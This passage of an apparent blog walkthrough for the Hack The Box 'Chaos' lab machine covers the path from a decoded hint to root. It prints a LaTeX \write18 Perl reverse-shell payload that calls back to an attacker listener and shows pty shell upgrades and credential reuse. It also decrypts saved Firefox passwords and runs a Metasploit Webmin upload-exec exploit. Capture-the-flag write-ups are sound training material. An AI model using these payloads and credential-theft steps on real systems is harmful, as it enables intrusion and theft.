+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">chaos</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">J00_w1ll_f1Nd_n07H1n9_H3r3</span>
+<span class="n">Thanks</span><span class="p">,</span>
+<span class="n">Ayush</span>
+</code></pre></div></div>
+
+<p>Okay! So under one layer of encryption and one layer of encoding we finally get to a clear text message that gives us a path foward. A new link. Let’s try going there in the web browser after adding an entry in our /etc/hosts file for chaos.htb to point to 10.10.10.120. We’re greeted with a new page:</p>
+
+<p><img src="/assets/images/posts/chaos-htb-walkthrough/chaos-4941.png" alt="chaos-4941.png" /></p>
+
+<p>Some type of pdf making service… Okay. Let’s put a shell command in the text field, pick one of the three templates (template 2 and 3 work, 1 doesn’t), and test it out. Before we do that though, we can start burpsuite to proxy all of our web requests. One of the many things burp allows us to do is edit and manipulate fields before the request is sent to the server. This makes it easy to send whatever data we want to this service.</p>
+
+<p>Once I hit Create PDF button, burp intercepts my request. Since I don’t want to modify anything, I allow it through and we see the server’s response in burp:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Sat, 25 May 2019 23:53:46 GMT
+Server: Apache/2.4.34 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 2804
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+FILE CREATED: 8e86b4170fe5983e267238d26390bb7a.pdf
+Download: http://chaos.htb/pdf/8e86b4170fe5983e267238d26390bb7a.pdf
+
+
+LOG:
+This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
+ \write18 enabled.
+entering extended mode
+(./8e86b4170fe5983e267238d26390bb7a.tex
+LaTeX2e &lt;2018-04-01&gt; patch level 5
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2014/09/29 v1.4h Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty
+(/usr/share/texlive/texmf-dist/tex/latex/base/latin1.def))
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
+For additional information on amsmath, use the `?' option.
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amssymb.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+No file 8e86b4170fe5983e267238d26390bb7a.aux.
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/oberdiek/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grfext.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvdefinekeys.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvsetkeys.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/etexcmds.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty))))
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
+(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}]
+(./8e86b4170fe5983e267238d26390bb7a.aux) )&lt;/usr/share/texlive/texmf-dist/fonts/
+type1/public/amsfonts/cm/cmr10.pfb&gt;
+Output written on 8e86b4170fe5983e267238d26390bb7a.pdf (1 page, 11808 bytes).
+Transcript written on 8e86b4170fe5983e267238d26390bb7a.log.
+</code></pre></div></div>
+
+<p>Note, the pdf making website we’re using isn’t setup to display the server’s response, so it never gave me this output. Since burp is intercepting our requests, it was able to see and log it for us. Anyway, we see some interesting things. We see what looks to be our PDF file being created and stored on the server. The first thing I try is to download our created pdf, but the server isn’t actually serving the PDF for downloading.</p>
+
+<p>We then see “pdfTeX” with a version number. After finding no exploits pertaining to that version of pdfTeX, I had to look up what pdfTeX was in the first place. I learned among other things it was in fact a pdf creating tool. I tried to throw various commands in, tested all the templates and came up short. I then saw this interesting line from the log:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  \write18 enabled.
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>I started to search around for that mode and what it does. Turns out it allows pdfTeX to execute shell commands. That sounds useful for an attacker… So, if it’ll run commands for me, let’s have it run a reverse shell that will connect back to my listener. First, I setup my listener on my local machine:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ nc -l -n -v -p 9002
+</code></pre></div></div>
+
+<p>Now I’m ready to receive a connection on port 9002. Let’s craft the text for the pdf maker so that it runs our reverse shell and connects back:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\immediate\write18{perl -e 'use Socket;$i="10.10.x.x";$p=9002;socket(S,PF_INET,SOCK_STREAM,
+getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");
+open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'}
+</code></pre></div></div>
+
+<p>Once I hit the Create PDF button, it works. I now have a shell on the machine:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ nc -l -n -v -p 9002                                                                              gn0stic@kali
+listening on [any] 9002 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.10.10.120] 43736
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></pre></div></div>
+
+<p>The process we used to get access on the machine was run by the “www-data” user, so the shell is limited and won’t allow us to do much:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ whoami
+www-data
+$ echo $0
+/bin/sh
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once we have a shell we do basic linux enumeration to look for ways to escalate our privileges. One of the many commands is to view /etc/passwd to view the users of the machine:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/passwd |grep ayush
+ayush:x:1001:1001:,,,:/home/ayush:/opt/rbash
+</code></pre></div></div>
+
+<p>We’ve seen a lot of talk from ayush and we have a password of his from before, so we look for him and find him. The /bin/sh won’t let us run the su command, so let’s use a little python trick to get a bash shell first:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@chaos:/home$ echo $0
+/bin/bash
+</code></pre></div></div>
+
+<p>Nice, now that we have a bash shell, let’s try to su as ayush and get that user flag.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chaos:/home$ su ayush
+su ayush
+Password: jiujitsu
+
+ayush@chaos:/home$ whoami
+whoami
+rbash: /usr/lib/command-not-found: restricted: cannot specify / in command names
+
+ayush@chaos:/home$ cat /home/ayush/user.txt
+cat /home/ayush/user.txt
+rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
+</code></pre></div></div>
+
+<p>We’re able to login, but ayush’s shell is rbash which is terribly restrictive. Instead of breaking out of the rbash jail using the typical methods, I found another way out:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chaos:/home$ su -l ayush
+su -l ayush
+Password: jiujitsu
+</code></pre></div></div>
+
+<p>The -l flag creates a login shell. This prevents loading of many environment variables and is enough for me to view the user flag:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~$ /bin/cat /home/ayush/user.txt
+/bin/cat /home/ayush/user.txt
+eef39126d9c{truncated} &lt;-------- Flag #1 is completed, we have user-level access
+</code></pre></div></div>
+
+<p>Now that we have user, let’s go for root. There are many methods and techniques to gain root privileges if the sysadmin or users aren’t careful. Looking in ayush’s home directory is a good start:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~$ ls -lah
+ls -lah
+total 40K
+drwx------ 6 ayush ayush 4.0K May 26 00:21 .
+drwxr-xr-x 4 root  root  4.0K Oct 28  2018 ..
+drwxr-xr-x 2 root  root  4.0K Oct 28  2018 .app
+-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
+-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
+-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
+drwx------ 3 ayush ayush 4.0K May 26 00:21 .gnupg
+drwx------ 3 ayush ayush 4.0K May 26 09:33 mail
+drwx------ 4 ayush ayush 4.0K Sep 29  2018 .mozilla
+-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
+-rw------- 1 ayush ayush   33 Oct 28  2018 user.txt
+</code></pre></div></div>
+
+<p>Often times we find good information in .bash_history, .bashrc, or their .profile folder. Here, I thought the .mozilla directory stood out. This is a hidden directory firefox creates and if the user is lazy, they’ll use firefox to save passwords for websites they visit often so it’ll auto-fill in. Let’s see:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ cat logins.json
+cat logins.json
+{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":
+"https://chaos.htb:10000","usernameField":"user","passwordField":"pass",
+"encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==",
+"encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb",
+"guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":
+1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
+</code></pre></div></div>
+
+<p>Looking at the logins.json file contents. We see a username / password is saved for this machine we’re attacking with port 10000. If we remember back to our port scan, we found webmin running on port 10000. We also found an exploit that allows RCE as root if we are authenticated to webmin. Looks like we’re close to the second flag.</p>
+
+<p>Back to the mozilla credentials, they’re encrypted. Firefox has the ability to use a master password to encrypt the passwords stored on disk to make our life as an attacker a little more difficult. There’s a python script that can decrypt these for us called <a href="https://github.com/Unode/firefox_decrypt">firefox_decrypt.py</a>. We just need to pass the script the master password. The first thing we try are the webmail credentials as ayush has proven he reuses passwords, and it works:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ python ../../code/firefox_decrypt/firefox_decrypt.py mozilla/firefox/bzo7sjt1.default 
+2019-05-26 08:53:27,018 - WARNING - profile.ini not found in mozilla/firefox/bzo7sjt1.default
+2019-05-26 08:53:27,018 - WARNING - Continuing and assuming 'mozilla/firefox/bzo7sjt1.default' is a profile location
+
+Master Password for profile mozilla/firefox/bzo7sjt1.default: 
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+</code></pre></div></div>
+
+<h2 id="exploitation-2">Exploitation: 2</h2>
+<p>One step closer. We go back to webmin and login to ensure the credentials work, they do. Now we have an authenticated session to the webmin service, which is all we need for the exploit we first found to work. The exploit is built for the metasploit framework, so let’s start that up and setup the exploit:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/ctf/htb/chaos λ msfconsole
+       =[ metasploit v5.0.23-dev                          ]
++ -- --=[ 1893 exploits - 1066 auxiliary - 329 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 &gt; use exploit/unix/webapp/webmin_upload_exec
+msf5 exploit(unix/webapp/webmin_upload_exec) &gt; show options
+
+Module options (exploit/unix/webapp/webmin_upload_exec):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILENAME                      no        Filename used for the uploaded data
+   GUESSUPLOAD  false            yes       If no "proc" permissions exists use default path.
+   PASSWORD                      yes       Webmin Password
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        10000            yes       The target port (TCP)
+   SSL          true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       Base path for Webmin application
+   USERNAME                      yes       Webmin Username
+   VHOST                         no        HTTP server virtual host
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin &lt;= 1.900
+
+msf5 exploit(unix/webapp/webmin_upload_exec) &gt; set password Thiv8wrej~
+password =&gt; Thiv8wrej~
+msf5 exploit(unix/webapp/webmin_upload_exec) &gt; set username root
+username =&gt; root
+msf5 exploit(unix/webapp/webmin_upload_exec) &gt; set rhosts 10.10.10.120
+rhosts =&gt; 10.10.10.120
+</code></pre></div></div>
+
+<p>Okay, we’ve set the required options and we’re ready to send the exploit:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(unix/webapp/webmin_upload_exec) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[+] Session cookie: dff81043d5e7e399da11f92929578f18
+[*] Target URL =&gt; https://10.10.10.120:10000
+[*] Searching for directory to upload...
+[+] File vyiywme.cgi was successfully uploaded.
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.x.x:4444 -&gt; 10.10.10.120:59360) at 2019-05-26 08:58:08 -0500
+[+] Deleted vyiywme.cgi
+</code></pre></div></div>
+
+<p>Looks like the exploit worked! We have a command shell opened. Let’s ensure we’re root and get our flag to complete the exercise:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+root
+cat /root/root.txt
+4eca7e09{truncated} &lt;-------- Flag #2, we have root and complete control of the system
+</code></pre></div></div>
+
+
+
+
+  <small>tags: <em></em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
